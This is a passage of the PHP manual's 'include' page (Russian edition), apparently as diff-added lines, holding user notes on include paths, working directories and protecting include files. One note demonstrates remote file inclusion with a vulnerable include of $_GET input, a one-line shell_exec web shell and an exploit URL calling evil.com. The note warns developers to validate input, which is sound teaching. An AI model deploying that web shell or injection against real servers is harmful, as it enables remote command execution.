+<div class="phpcode"><code><span class="html">This might be useful:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">].</span><span class="string">"/lib/sample.lib.php"</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span>So you can move script anywhere in web-project tree without changes.</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="116522">  <div class="votes">
+    <div id="Vu116522">
+    <a href="https://www.php.net/manual/vote-note.php?id=116522&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd116522">
+    <a href="https://www.php.net/manual/vote-note.php?id=116522&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V116522" title="61% like this...">
+    52
+    </div>
+  </div>
+  <a href="function.include.php.html#116522" class="name">
+  <strong class="user"><em>Rash</em></strong></a><a class="genanchor" href="function.include.php.html#116522"> &para;</a><div class="date" title="2015-01-17 05:55"><strong>9 years ago</strong></div>
+  <div class="text" id="Hcom116522">
+<div class="phpcode"><code><span class="html">If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:<br /><br /><span class="default">&lt;?php<br /><br /></span><span class="comment"># index.php<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'what'</span><span class="keyword">, </span><span class="string">'ever'</span><span class="keyword">);<br />include </span><span class="string">'includeFile.php'</span><span class="keyword">;<br /><br /></span><span class="comment"># includeFile.php<br /><br />// check if what is defined and die if not<br /><br /></span><span class="default">?&gt;<br /></span><br />The reason you should not do this is because there is a better option available. Move the includeFile(s) out of the document root of your project. So if the document root of your project is at "/usr/share/nginx/html", keep the include files in "/usr/share/nginx/src".<br /><br /><span class="default">&lt;?php<br /><br /></span><span class="comment"># index.php (in document root (/usr/share/nginx/html))<br /><br /></span><span class="keyword">include </span><span class="default">__DIR__ </span><span class="keyword">. </span><span class="string">'/../src/includeFile.php'</span><span class="keyword">;<br /><br /></span><span class="default">?&gt;<br /></span><br />Since user can't type 'your.site/../src/includeFile.php', your includeFile(s) would not be accessible to the user directly.</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="120069">  <div class="votes">
+    <div id="Vu120069">
+    <a href="https://www.php.net/manual/vote-note.php?id=120069&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd120069">
+    <a href="https://www.php.net/manual/vote-note.php?id=120069&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V120069" title="61% like this...">
+    35
+    </div>
+  </div>
+  <a href="function.include.php.html#120069" class="name">
+  <strong class="user"><em>John Carty</em></strong></a><a class="genanchor" href="function.include.php.html#120069"> &para;</a><div class="date" title="2016-10-20 08:29"><strong>7 years ago</strong></div>
+  <div class="text" id="Hcom120069">
+<div class="phpcode"><code><span class="html">Before using php's include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).<br /><br />As example #3 points out, it is possible to include a php file from a remote server.<br /><br />The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.  Suppose you have an example.php with code:<br /><br /><span class="default">&lt;?php<br /></span><span class="comment">// Bad Code<br /></span><span class="default">$path </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'path'</span><span class="keyword">];<br />include </span><span class="default">$path </span><span class="keyword">. </span><span class="string">'example-config-file.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />As a programmer, you might expect the user to browse to the path that you specify.<br /><br />However, it opens up an RFI vulnerability.  To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.<br /><br />evil.txt<br /><span class="default">&lt;?php </span><span class="keyword">echo </span><span class="default">shell_exec</span><span class="keyword">(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'command'</span><span class="keyword">]);</span><span class="default">?&gt;<br /></span><br />It is a text file so it would not be processed on my server but on the target/victim server.  I would browse to:<br />h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br /><br />The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.  In this case, it is whoami.  I ended the path variable with a %00, which is the null character.  The original include statement in the example.php would ignore the rest of the line.  It should tell me who the web server is running as.<br /><br />Please use proper input validation if you use variables in an include statement.</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="107685">  <div class="votes">
+    <div id="Vu107685">
+    <a href="https://www.php.net/manual/vote-note.php?id=107685&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd107685">
+    <a href="https://www.php.net/manual/vote-note.php?id=107685&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V107685" title="57% like this...">
+    29
+    </div>
+  </div>
+  <a href="function.include.php.html#107685" class="name">
+  <strong class="user"><em>Anon</em></strong></a><a class="genanchor" href="function.include.php.html#107685"> &para;</a><div class="date" title="2012-02-26 06:31"><strong>11 years ago</strong></div>
+  <div class="text" id="Hcom107685">
+<div class="phpcode"><code><span class="html">I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();<br />Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="118083">  <div class="votes">
+    <div id="Vu118083">
+    <a href="https://www.php.net/manual/vote-note.php?id=118083&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd118083">
+    <a href="https://www.php.net/manual/vote-note.php?id=118083&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V118083" title="57% like this...">
+    14
+    </div>
+  </div>
+  <a href="function.include.php.html#118083" class="name">
+  <strong class="user"><em>error17191 at gmail dot com</em></strong></a><a class="genanchor" href="function.include.php.html#118083"> &para;</a><div class="date" title="2015-10-01 09:39"><strong>8 years ago</strong></div>
+  <div class="text" id="Hcom118083">
+<div class="phpcode"><code><span class="html">When including a file using its name directly without specifying we are talking about the current working directory, i.e. saying (include "file") instead of ( include "./file") . PHP will search first in the current working directory (given by getcwd() ) , then next searches for it in the directory of the script being executed (given by __dir__).<br />This is an example to demonstrate the situation :<br />We have two directory structure :<br />-dir1<br />----script.php<br />----test<br />----dir1_test<br />-dir2<br />----test<br />----dir2_test<br /><br />dir1/test contains the following text :<br />This is test in dir1<br />dir2/test contains the following text:<br />This is test in dir2<br />dir1_test contains the following text:<br />This is dir1_test<br />dir2_test contains the following text:<br />This is dir2_test<br /><br />script.php contains the following code:<br /><span class="default">&lt;?php<br /><br /></span><span class="keyword">echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Changing current working directory to dir2'</span><span class="keyword">;<br /></span><span class="default">chdir</span><span class="keyword">(</span><span class="string">'../dir2'</span><span class="keyword">);<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "dir2_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'dir2_test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "dir1_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'dir1_test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "./dir1_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />(@include </span><span class="string">'./dir1_test'</span><span class="keyword">) or die(</span><span class="string">'couldn\'t include this file '</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>The output of executing script.php is :<br /><br />Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir1<br />including "test" ...<br />This is test in dir1<br />Changing current working directory to dir2<br />Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir2<br />including "test" ...<br />This is test in dir2<br />including "dir2_test" ...<br />This is dir2_test<br />including "dir1_test" ...<br />This is dir1_test<br />including "./dir1_test" ...<br />couldn't include this file</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="122667">  <div class="votes">
+    <div id="Vu122667">
+    <a href="https://www.php.net/manual/vote-note.php?id=122667&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd122667">
+    <a href="https://www.php.net/manual/vote-note.php?id=122667&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V122667" title="55% like this...">
+    4
+    </div>
+  </div>
+  <a href="function.include.php.html#122667" class="name">
+  <strong class="user"><em>jbezorg at gmail dot com</em></strong></a><a class="genanchor" href="function.include.php.html#122667"> &para;</a><div class="date" title="2018-04-26 02:34"><strong>5 years ago</strong></div>
+  <div class="text" id="Hcom122667">
+<div class="phpcode"><code><span class="html">Ideally includes should be kept outside of the web root. That's not often possible though especially when distributing packaged applications where you don't know the server environment your application will be running in. In those cases I use the following as the first line.<br /><br />( __FILE__ != $_SERVER['SCRIPT_FILENAME'] ) or exit ( 'No' );</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="86527">  <div class="votes">
+    <div id="Vu86527">
+    <a href="https://www.php.net/manual/vote-note.php?id=86527&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd86527">
+    <a href="https://www.php.net/manual/vote-note.php?id=86527&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V86527" title="56% like this...">
+    9
+    </div>
+  </div>
+  <a href="function.include.php.html#86527" class="name">
+  <strong class="user"><em>Wade.</em></strong></a><a class="genanchor" href="function.include.php.html#86527"> &para;</a><div class="date" title="2008-10-22 08:20"><strong>15 years ago</strong></div>
+  <div class="text" id="Hcom86527">
+<div class="phpcode"><code><span class="html">If you're doing a lot of dynamic/computed includes (&gt;100, say), then you may well want to know this performance comparison: if the target file doesn't exist, then an @include() is *ten* *times* *slower* than prefixing it with a file_exists() check. (This will be important if the file will only occasionally exist - e.g. a dev environment has it, but a prod one doesn't.)<br /><br />Wade.</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="127845">  <div class="votes">
+    <div id="Vu127845">
+    <a href="https://www.php.net/manual/vote-note.php?id=127845&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd127845">
+    <a href="https://www.php.net/manual/vote-note.php?id=127845&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V127845" title="54% like this...">
+    1
+    </div>
+  </div>
+  <a href="function.include.php.html#127845" class="name">
+  <strong class="user"><em>anonphpuser</em></strong></a><a class="genanchor" href="function.include.php.html#127845"> &para;</a><div class="date" title="2022-10-23 11:07"><strong>1 year ago</strong></div>
+  <div class="text" id="Hcom127845">
+<div class="phpcode"><code><span class="html">In the Example #2 Including within functions, the last two comments should be reversed I believe.</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="115827">  <div class="votes">
+    <div id="Vu115827">
+    <a href="https://www.php.net/manual/vote-note.php?id=115827&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd115827">
+    <a href="https://www.php.net/manual/vote-note.php?id=115827&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V115827" title="53% like this...">
+    5
+    </div>
+  </div>
+  <a href="function.include.php.html#115827" class="name">
+  <strong class="user"><em>Ray.Paseur often uses Gmail</em></strong></a><a class="genanchor" href="function.include.php.html#115827"> &para;</a><div class="date" title="2014-09-30 11:05"><strong>9 years ago</strong></div>
+  <div class="text" id="Hcom115827">
+<div class="phpcode"><code><span class="html">It's worth noting that PHP provides an OS-context aware constant called DIRECTORY_SEPARATOR.  If you use that instead of slashes in your directory paths your scripts will be correct whether you use *NIX or (shudder) Windows.  (In a semi-related way, there is a smart end-of-line character, PHP_EOL)<br /><br />Example:<br /><span class="default">&lt;?php <br />$cfg_path<br /></span><span class="keyword">= </span><span class="string">'includes'<br /></span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR<br /></span><span class="keyword">. </span><span class="string">'config.php'<br /></span><span class="keyword">;<br />require_once(</span><span class="default">$cfg_path</span><span class="keyword">);</span></span></code></div>
+  </div>
+ </div>
+  <div class="note" id="94392">  <div class="votes">
+    <div id="Vu94392">
+    <a href="https://www.php.net/manual/vote-note.php?id=94392&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd94392">
+    <a href="https://www.php.net/manual/vote-note.php?id=94392&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V94392" title="53% like this...">
+    6
+    </div>
+  </div>
+  <a href="function.include.php.html#94392" class="name">
+  <strong class="user"><em>hyponiq at gmail dot com</em></strong></a><a class="genanchor" href="function.include.php.html#94392"> &para;</a><div class="date" title="2009-11-02 02:12"><strong>14 years ago</strong></div>
+  <div class="text" id="Hcom94392">
+<div class="phpcode"><code><span class="html">I would like to point out the difference in behavior in IIS/Windows and Apache/Unix (not sure about any others, but I would think that any server under Windows will be have the same as IIS/Windows and any server under Unix will behave the same as Apache/Unix) when it comes to path specified for included files.<br /><br />Consider the following:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />In IIS/Windows, the file is looked for at the root of the virtual host (we'll say C:\Server\Sites\MySite) since the path began with a forward slash.  This behavior works in HTML under all platforms because browsers interpret the / as the root of the server.<br /><br />However, Unix file/folder structuring is a little different.  The / represents the root of the hard drive or current hard drive partition.  In other words, it would basically be looking for root:/Path/To/File.php instead of serverRoot:/Path/To/File.php (which we'll say is /usr/var/www/htdocs).  Thusly, an error/warning would be thrown because the path doesn't exist in the root path.<br /><br />I just thought I'd mention that.  It will definitely save some trouble for those users who work under Windows and transport their applications to an Unix-based server.<br /><br />A work around would be something like:<br /><span class="default">&lt;?php<br />$documentRoot </span><span class="keyword">= </span><span class="default">null</span><span class="keyword">;<br /><br />if (isset(</span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">])) {<br />    </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">];<br />    <br />    if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">) || </span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />        if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">)) {<br />            </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'/'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />        }<br />        elseif (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />            </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'\\'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />        }<br />    }<br />    <br />    if (</span><span class="default">preg_match</span><span class="keyword">(</span><span class="string">'/[^\\/]{1}\\[^\\/]{1}/'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">)) {<br />        </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/([^\\/]{1})\\([^\\/]{1})/'</span><span class="keyword">, </span><span class="string">'\\1DIR_SEP\\2'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />        </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'DIR_SEP'</span><span class="keyword">, </span><span class="string">'\\\\'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />    }<br />}<br />else {<br />    </span><span class="comment">/**<br />     * I usually store this file in the Includes folder at the root of my<br />     * virtual host. This can be changed to wherever you store this file.<br />     * <br />     * Example:<br />     * If you store this file in the Application/Settings/DocRoot folder at the<br />     * base of your site, you would change this array to include each of those<br />     * folders.<br />     * <br />     * &lt;code&gt;<br />     * $directories = array(<br />     *     'Application',<br />     *     'Settings',<br />     *     'DocRoot'<br />     * );<br />     * &lt;/code&gt;<br />     */<br />    </span><span class="default">$directories </span><span class="keyword">= array(<br />        </span><span class="string">'Includes'<br />    </span><span class="keyword">);<br />    <br />    if (</span><span class="default">defined</span><span class="keyword">(</span><span class="string">'__DIR__'</span><span class="keyword">)) {<br />        </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">__DIR__</span><span class="keyword">;<br />    }<br />    else {<br />        </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">);<br />    }<br />    <br />    </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />    </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">$currentDirectory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">;<br />    <br />    foreach (</span><span class="default">$directories </span><span class="keyword">as </span><span class="default">$directory</span><span class="keyword">) {<br />        </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(<br />            </span><span class="default">DIRECTORY_SEPARATOR </span><span class="keyword">. </span><span class="default">$directory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />            </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />            </span><span class="default">$currentDirectory<br />        </span><span class="keyword">);<br />    }<br />    <br />    </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />}<br /><br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'SERVER_DOC_ROOT'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />Using this file, you can include files using the defined SERVER_DOC_ROOT constant and each file included that way will be included from the correct location and no errors/warnings will be thrown.<br /><br />Example:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="default">SERVER_DOC_ROOT </span><span class="keyword">. </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;</span></span></code></div>
+  </div>
+ </div>
+  <div class="note" id="94586">  <div class="votes">
+    <div id="Vu94586">
+    <a href="https://www.php.net/manual/vote-note.php?id=94586&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd94586">
+    <a href="https://www.php.net/manual/vote-note.php?id=94586&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V94586" title="53% like this...">
+    4
+    </div>
+  </div>
+  <a href="function.include.php.html#94586" class="name">
+  <strong class="user"><em>Chris Bell</em></strong></a><a class="genanchor" href="function.include.php.html#94586"> &para;</a><div class="date" title="2009-11-12 05:12"><strong>14 years ago</strong></div>
+  <div class="text" id="Hcom94586">
+<div class="phpcode"><code><span class="html">A word of warning about lazy HTTP includes - they can break your server.<br /><br />If you are including a file from your own site, do not use a URL however easy or tempting that may be. If all of your PHP processes are tied up with the pages making the request, there are no processes available to serve the include. The original requests will sit there tying up all your resources and eventually time out.<br /><br />Use file references wherever possible. This caused us a considerable amount of grief (Zend/IIS) before I tracked the problem down.</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="83066">  <div class="votes">
+    <div id="Vu83066">
+    <a href="https://www.php.net/manual/vote-note.php?id=83066&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd83066">
+    <a href="https://www.php.net/manual/vote-note.php?id=83066&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V83066" title="52% like this...">
+    8
+    </div>
+  </div>
+  <a href="function.include.php.html#83066" class="name">
+  <strong class="user"><em>Rick Garcia</em></strong></a><a class="genanchor" href="function.include.php.html#83066"> &para;</a><div class="date" title="2008-05-08 09:38"><strong>15 years ago</strong></div>
+  <div class="text" id="Hcom83066">
+<div class="phpcode"><code><span class="html">As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:<br /><br />----<br /><span class="default">&lt;?php </span><span class="comment">// prepend.php - autoprepended at the top of your tree<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'MAINDIR'</span><span class="keyword">,</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/'</span><span class="keyword">);<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'DL_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'downloads/'</span><span class="keyword">);<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'LIB_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'lib/'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>----<br /><br />and so on. This way, the files in your framework will only have to issue statements such as this:<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">require_once(</span><span class="default">LIB_DIR </span><span class="keyword">. </span><span class="string">'excel_functions.php'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />This also frees you from having to check the include path each time you do an include.<br /><br />If you're running scripts from below your main web directory, put a prepend.php file in each subdirectory:<br /><br />--<br /><span class="default">&lt;?php<br /></span><span class="keyword">include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">)) . </span><span class="string">'/prepend.php'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>--<br /><br />This way, the prepend.php at the top always gets executed and you'll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.</span></code></div>
+  </div>
+ </div>
+  <div class="note" id="120925">  <div class="votes">
+    <div id="Vu120925">
+    <a href="https://www.php.net/manual/vote-note.php?id=120925&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+    </div>
+    <div id="Vd120925">
+    <a href="https://www.php.net/manual/vote-note.php?id=120925&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+    </div>
+    <div class="tally" id="V120925" title="51% like this...">
+    1
+    </div>
+  </div>
+  <a href="function.include.php.html#120925" class="name">
+  <strong class="user"><em>ayon at hyurl dot com</em></strong></a><a class="genanchor" href="function.include.php.html#120925"> &para;</a><div class="date" title="2017-04-03 06:24"><strong>6 years ago</strong></div>
+  <div class="text" id="Hcom120925">
+<div class="phpcode"><code><span class="html">It is also able to include or open a file from a zip file:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="string">"something.zip#script.php"</span><span class="keyword">;<br />echo </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">"something.zip#script.php"</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>Note that instead of using / or \, open a file from a zip file uses # to separate zip name and inner file's name.</span></code></div>
+  </div>
+ </div></div>
+<div class="foot"><a href="https://www.php.net/manual/add-note.php?sect=function.include&amp;redirect=https://www.php.net/manual/ru/function.include.php">＋<small>add a note</small></a></div>
+</section>    </section><!-- layout-content -->
+        <aside class='layout-menu'>
+
+        <ul class='parent-menu-list'>
+                                    <li>
+                <a href="language.control-structures.php.html">Управляющие конструкции</a>
+
+                                    <ul class='child-menu-list'>
+
+                                                <li class="">
+                            <a href="control-structures.intro.php.html" title="Введение">Введение</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.if.php.html" title="if">if</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.else.php.html" title="else">else</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.elseif.php.html" title="elseif/else if">elseif/else if</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.alternative-syntax.php.html" title="Альтернативный синтаксис управляющих структур">Альтернативный синтаксис управляющих структур</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.while.php.html" title="while">while</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.do.while.php.html" title="do-&#8203;while">do-&#8203;while</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.for.php.html" title="for">for</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.foreach.php.html" title="foreach">foreach</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.break.php.html" title="break">break</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.continue.php.html" title="continue">continue</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.switch.php.html" title="switch">switch</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.match.php.html" title="match">match</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.declare.php.html" title="declare">declare</a>
+                        </li>
+                                                <li class="">
+                            <a href="function.return.php.html" title="return">return</a>
+                        </li>
+                                                <li class="">
+                            <a href="function.require.php.html" title="require">require</a>
+                        </li>
+                                                <li class="current">
+                            <a href="function.include.php.html" title="include">include</a>
+                        </li>
+                                                <li class="">
+                            <a href="function.require-once.php.html" title="require_&#8203;once">require_&#8203;once</a>
+                        </li>
+                                                <li class="">
+                            <a href="function.include-once.php.html" title="include_&#8203;once">include_&#8203;once</a>
+                        </li>
+                                                <li class="">
+                            <a href="control-structures.goto.php.html" title="goto">goto</a>
+                        </li>
+                        
+                    </ul>
+                
+            </li>
+                        
+                    </ul>
+    </aside>
+
+
+  </div><!-- layout -->
+
+  <footer>
+    <div class="container footer-content">
+      <div class="row-fluid">
+      <ul class="footmenu">
+        <li><a href="https://www.php.net/copyright.php">Copyright &copy; 2001-2024 The PHP Group</a></li>
+        <li><a href="https://www.php.net/my.php">My PHP.net</a></li>
+        <li><a href="https://www.php.net/contact.php">Contact</a></li>
+        <li><a href="https://www.php.net/sites.php">Other PHP.net sites</a></li>
+        <li><a href="https://www.php.net/privacy.php">Privacy policy</a></li>
+      </ul>
+      </div>
+    </div>
+  </footer>
+
+    
+ <!-- External and third party libraries. -->
+ <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="../../cached.php%3Ft=1657730402&amp;f=%252Fjs%252Fext%252Fhogan-3.0.2.min.js"></script>
+<script src="../../cached.php%3Ft=1421837618&amp;f=%252Fjs%252Fext%252Ftypeahead.min.js"></script>
+<script src="../../cached.php%3Ft=1657876202&amp;f=%252Fjs%252Fext%252Fmousetrap.min.js"></script>
+<script src="../../cached.php%3Ft=1657730402&amp;f=%252Fjs%252Fext%252Fjquery.scrollTo.min.js"></script>
+<script src="../../cached.php%3Ft=1701958202&amp;f=%252Fjs%252Fsearch.js"></script>
+<script src="../../cached.php%3Ft=1701958202&amp;f=%252Fjs%252Fcommon.js"></script>
+
